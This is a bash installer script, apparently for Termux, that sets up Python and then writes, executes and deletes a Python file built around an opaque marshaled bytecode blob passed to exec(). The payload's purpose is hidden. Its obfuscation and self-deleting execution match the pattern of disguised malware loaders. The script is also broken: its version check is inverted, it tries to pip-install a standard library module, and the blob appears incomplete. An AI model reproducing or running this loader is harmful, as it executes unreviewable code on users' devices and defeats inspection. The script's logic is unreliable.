#!/bin/bash

# Function to check if Python3 is installed and its version
check_and_install_python() {
    if ! command -v python3 &> /dev/null; then
        echo "Python3 is not installed. Installing Python3..."
        pkg install -y python
    fi
    
    # Check the Python version
    PYTHON_VERSION=$(python3 -c "import sys; print(sys.version_info.major, sys.version_info.minor, sys.version_info.micro)")
    REQUIRED_VERSION="3 9 16"

    # Check if Python version is below 3.9.16
    if [[ "$PYTHON_VERSION" < "$REQUIRED_VERSION" ]]; then
        echo "Python version $PYTHON_VERSION is compatible."
    else
        echo "Error: Python version $PYTHON_VERSION is not supported. Installing compatible Python version..."
        # In Termux, the default Python3 version might be incompatible, so we install the required version
        pkg install -y python
        # Force a recheck if Python is installed and if version is compatible
        PYTHON_VERSION=$(python3 -c "import sys; print(sys.version_info.major, sys.version_info.minor, sys.version_info.micro)")
        if [[ "$PYTHON_VERSION" < "$REQUIRED_VERSION" ]]; then
            echo "Python version $PYTHON_VERSION is compatible."
        else
            echo "Error: Could not install compatible Python version. Exiting."
            exit 1
        fi
    fi
}

# Function to install required Python modules
install_python_modules() {
    echo "Checking and installing required Python modules..."
    pip install --upgrade pip
    pip install marshal
}

# Function to execute the Python code
run_marshal_code() {
    cat << 'EOF' > marshal_script.py
from marshal import loads

bytecode = loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s\xf8\x00\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x00d\x01l\x04Z\x04d\x00d\x02l\x05m\x06Z\x06\x01\x00d\x00d\x03l\x07m\x08Z\x08m\tZ\tm\nZ\nm\x0bZ\x0b\x01\x00d\x00d\x04l\x0cm\rZ\r\x01\x00d\x00d\x05l\x0em\x0fZ\x0f\x01\x00e\x06\x83\x00Z\x10d\x06Z\x11e\x04\xa0\x12e\x11\xa0\x13\xa1\x00\xa1\x01\xa0\x14\xa1\x00Z\x15d\x07Z\x16d\x08e\x16\x9b\x00d\t\x9d\x03Z\x17d\nd\x0b\x84\x00Z\x18d\x0cd\r\x84\x00Z\x19d\x1ed\x0fd\x10\x84\x01Z\x1ad\x11d\x12\x84\x00Z\x1bd\x13d\x14\x84\x00Z\x1cd\x15d\x16\x84\x00Z\x1dd\x17d\x18\x84\x00Z\x1ed\x19d\x1a\x84\x00Z\x1fd\x1bd\x1c\x84\x00Z e!d\x1dk\x02r\xf4e\x18\x83\x00\x01\x00e\x1b\x83\x00\x01\x00e \x83\x00\x01\x00d\x01S\x00')
exec(bytecode)
EOF

    python3 marshal_script.py && rm -f marshal_script.py
}

# Main logic
check_and_install_python
install_python_modules
run_marshal_code
